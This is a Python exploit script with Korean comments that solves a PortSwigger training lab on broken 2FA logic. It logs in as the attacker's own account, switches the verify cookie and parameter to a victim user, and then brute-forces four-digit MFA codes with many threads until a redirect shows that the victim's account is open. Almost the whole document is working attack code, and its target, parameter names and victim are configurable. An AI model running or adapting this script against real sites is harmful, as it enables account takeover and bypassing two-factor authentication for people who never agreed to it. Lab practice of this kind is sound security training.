#!/usr/bin/env python3
"""
Authentication - 2FA Broken Logic (verify parameter tampering + code brute-force)
PortSwigger Lab:
  https://portswigger.net/web-security/authentication/multi-factor/lab-2fa-broken-logic

흐름:
  1) 자기 계정(wiener:peter)으로 POST /login → 2FA 단계 세션 확보
  2) GET /login2?verify=carlos 로 "피해자용 임시 2FA 코드" 생성
     (verify 파라미터가 어느 사용자의 코드를 검증할지 결정하는 결함)
  3) POST /login2 에 verify=carlos & mfa-code=§코드§ 를 brute-force
     → 302 응답이 정답 코드
  4) 필요 시 /my-account 접근으로 검증

기존 툴(14-authentication-brute-force.py)의 목록 로더/세션을 일부 재사용한다.

사용 예시:
  python3 14-authentication-2fa-broken-logic.py \\
    --target "https://LAB-ID.web-security-academy.net" \\
    --valid-username wiener --valid-password peter \\
    --victim carlos --verify
"""

import argparse
import importlib.util
import itertools
import os
import re
import sys
import threading
import urllib.parse
from concurrent.futures import ThreadPoolExecutor

import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

_HERE = os.path.dirname(os.path.abspath(__file__))
_BF_PATH = os.path.join(_HERE, "14-authentication-brute-force.py")

TIMEOUT = 15
SUCCESS_CODES = (301, 302, 303, 307, 308)


def _load_bruteforce():
    spec = importlib.util.spec_from_file_location("auth_bruteforce", _BF_PATH)
    mod = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(mod)
    return mod


def find_csrf(html: str, field: str = "csrf") -> str | None:
    m = (re.search(rf'name=["\']?{field}["\']?\s+value=["\']?([^"\'\s>]+)', html)
         or re.search(rf'value=["\']?([^"\'\s>]+)["\']?\s+name=["\']?{field}', html))
    return m.group(1) if m else None


def set_cookie(session: requests.Session, name: str, value: str) -> None:
    """기존 동명 쿠키가 있으면 값을 교체하고, 없으면 새로 설정한다."""
    found = False
    for c in session.cookies:
        if c.name == name:
            c.value = value
            found = True
    if not found:
        session.cookies.set(name, value)


def main() -> None:
    parser = argparse.ArgumentParser(
        description="2FA broken logic — verify 파라미터 조작 + 코드 brute-force"
    )
    parser.add_argument("--target", required=True,
                        help="대상 베이스 URL (예: https://LAB.web-security-academy.net)")
    parser.add_argument("--valid-username", default="wiener",
                        help="자기 계정 username (기본: wiener)")
    parser.add_argument("--valid-password", default="peter",
                        help="자기 계정 password (기본: peter)")
    parser.add_argument("--victim", default="carlos",
                        help="공격 대상 username (기본: carlos)")
    parser.add_argument("--login-path", default="/login",
                        help="1차 로그인 경로 (기본: /login)")
    parser.add_argument("--mfa-path", default="/login2",
                        help="2FA 검증 경로 (기본: /login2)")
    parser.add_argument("--verify-param", default="verify",
                        help="검증 대상 파라미터 이름 (기본: verify)")
    parser.add_argument("--verify-cookie", default="verify",
                        help="검증 대상 쿠키 이름 (기본: verify; 이 랩은 쿠키로 동작)")
    parser.add_argument("--mfa-field", default="mfa-code",
                        help="2FA 코드 파라미터 이름 (기본: mfa-code)")
    parser.add_argument("--code-length", type=int, default=4,
                        help="2FA 코드 자릿수 (기본: 4)")
    parser.add_argument("--start", type=int, default=None,
                        help="시작 코드 (기본: 0)")
    parser.add_argument("--end", type=int, default=None,
                        help="종료 코드 (기본: 10^length-1)")
    parser.add_argument("--threads", type=int, default=30,
                        help="동시 요청 수 (기본: 30)")
    parser.add_argument("--delay", type=float, default=0.0,
                        help="요청 간 지연(초) (기본: 0; 스레드 모드에서는 스레드별 적용)")
    parser.add_argument("--session", default=None,
                        help="기존 세션 쿠키 값 (선택)")
    parser.add_argument("--verify", dest="verify", action="store_true", default=True,
                        help="찾은 코드로 리다이렉트 추적 및 /my-account 로그인 확인 (기본: 수행)")
    parser.add_argument("--no-verify", dest="verify", action="store_false",
                        help="결과 확인(계정 페이지 접근) 생략")
    parser.add_argument("--account-path", default="/my-account",
                        help="검증 시 접근할 계정 경로 (기본: /my-account)")
    args = parser.parse_args()

    base = args.target.rstrip("/")
    login_url = base + args.login_path
    mfa_url = base + args.mfa_path

    start = args.start if args.start is not None else 0
    end = args.end if args.end is not None else (10 ** args.code_length - 1)
    total = end - start + 1

    s = requests.Session()
    s.verify = False
    if args.session:
        s.cookies.set("session", args.session)

    # 1) 1차 로그인 (2FA 단계까지)
    print(f"[*] 1단계 — 자기 계정 로그인 ({args.valid_username})")
    login_page = s.get(login_url, timeout=TIMEOUT)
    csrf = find_csrf(login_page.text)
    data = {"username": args.valid_username, "password": args.valid_password}
    if csrf:
        data["csrf"] = csrf
    r = s.post(login_url, data=data, timeout=TIMEOUT, allow_redirects=False)
    print(f"    POST {args.login_path} → status={r.status_code} "
          f"location={r.headers.get('Location', '')}")
    if r.status_code not in SUCCESS_CODES and "login2" not in r.headers.get("Location", ""):
        print("    [!] 2FA 단계로 이동하지 않은 것 같습니다. 자격증명/경로를 확인하세요.")

    # 2) 피해자용 임시 코드 생성 (verify 쿠키를 피해자로 변경)
    print(f"[*] 2단계 — verify 쿠키를 피해자로 변경: "
          f"{args.verify_cookie}={args.victim}")
    set_cookie(s, args.verify_cookie, args.victim)
    print(f"[*] 피해자 코드 생성: GET {args.mfa_path}")
    mfa_page = s.get(mfa_url, params={args.verify_param: args.victim},
                     timeout=TIMEOUT, allow_redirects=True)
    mfa_csrf = find_csrf(mfa_page.text)
    print(f"    status={mfa_page.status_code} len={len(mfa_page.text)} "
          f"csrf={'획득' if mfa_csrf else '없음'}")

    # 3) 코드 brute-force
    print(f"[*] 3단계 — mfa-code brute-force ({start}~{end}, {total}개, threads={args.threads})")
    print(f"    {args.verify_param}={args.victim}, field={args.mfa_field}")
    print("    " + "-" * 56)

    found = {"code": None, "location": None, "cookies": None}
    lock = threading.Lock()
    stop = threading.Event()
    counter = itertools.count(1)

    def try_code(n: int) -> None:
        if stop.is_set():
            return
        code = f"{n:0{args.code_length}d}"
        post_data = {args.verify_param: args.victim, args.mfa_field: code}
        if mfa_csrf:
            post_data["csrf"] = mfa_csrf
        try:
            resp = s.post(mfa_url, params={args.verify_param: args.victim},
                          data=post_data, timeout=TIMEOUT, allow_redirects=False)
        except requests.exceptions.RequestException as e:
            with lock:
                print(f"    [{code}] 요청 실패: {e}")
            return
        i = next(counter)
        if resp.status_code in SUCCESS_CODES:
            with lock:
                if not stop.is_set():
                    stop.set()
                    found["code"] = code
                    found["location"] = resp.headers.get("Location")
                    found["cookies"] = resp.cookies
                    print(f"    [{code}] status={resp.status_code}  <== 성공")
        elif i % 500 == 0:
            with lock:
                print(f"    [{i}/{total}] 진행 중... (마지막 시도: {code})")
        if args.delay:
            import time
            time.sleep(args.delay)

    with ThreadPoolExecutor(max_workers=max(1, args.threads)) as ex:
        ex.map(try_code, range(start, end + 1))

    if not found["code"]:
        print("\n[-] 코드를 찾지 못했습니다.")
        print("    → 코드 유효시간 만료/재로그인 필요, --threads 조정, 범위(--start/--end) 확인")
        sys.exit(1)

    code = found["code"]
    print(f"\n[+] 2FA 코드 발견: {code}")
    print(f"[=] 결과: {args.victim} / code={code}")

    # 4) 결과 확인 — 성공 응답의 세션 쿠키로 새 세션을 구성해 계정 페이지 검증
    if not args.verify:
        return

    # 동시 요청으로 공유 세션의 쿠키가 덮였을 수 있으므로
    # 성공 응답이 발급한 쿠키를 보존한 세션을 별도로 만든다.
    vs = requests.Session()
    vs.verify = False
    vs.cookies.update(s.cookies)
    if found.get("cookies") is not None:
        vs.cookies.update(found["cookies"])
    print("    세션 쿠키: " + "; ".join(f"{c.name}={c.value}" for c in vs.cookies))

    loc = found.get("location")
    if loc:
        follow_url = urllib.parse.urljoin(base + "/", loc)
        print(f"\n[*] 리다이렉트 추적: GET {follow_url}")
        try:
            redir = vs.get(follow_url, timeout=TIMEOUT, allow_redirects=True)
            print(f"    → status={redir.status_code}, 최종 URL={redir.url}, len={len(redir.text)}")
        except requests.exceptions.RequestException as e:  # noqa: BLE001
            print(f"    리다이렉트 추적 실패: {e}")

    acct = vs.get(base + args.account_path, timeout=TIMEOUT, allow_redirects=True)
    print(f"\n[*] 검증 — GET {args.account_path} → status={acct.status_code}, len={len(acct.text)}")
    m = re.search(r'(?i)your username is:?\s*(?:<[^>]+>)?\s*([^<\s]+)', acct.text)
    logged_in = "log out" in acct.text.lower()
    if m:
        print(f"[+] 로그인 사용자: {m.group(1)}")
    if logged_in:
        print("[+] 로그아웃 링크 확인 → 로그인 상태")
    who = m.group(1) if m else None
    if acct.status_code == 200 and who and who.lower() == args.victim.lower():
        print(f"[✓] {args.victim} 계정으로 로그인 확인")
    elif acct.status_code == 200 and logged_in:
        print(f"[?] 로그인은 되었으나 사용자명을 페이지에서 확인하지 못했습니다 (기대: {args.victim})")
    else:
        print("[?] 계정 페이지에서 로그인 상태를 확인하지 못했습니다.")
        print("    → 세션 쿠키 갱신/코드 유효시간 문제일 수 있습니다. 재실행해 보세요.")


if __name__ == "__main__":
    main()
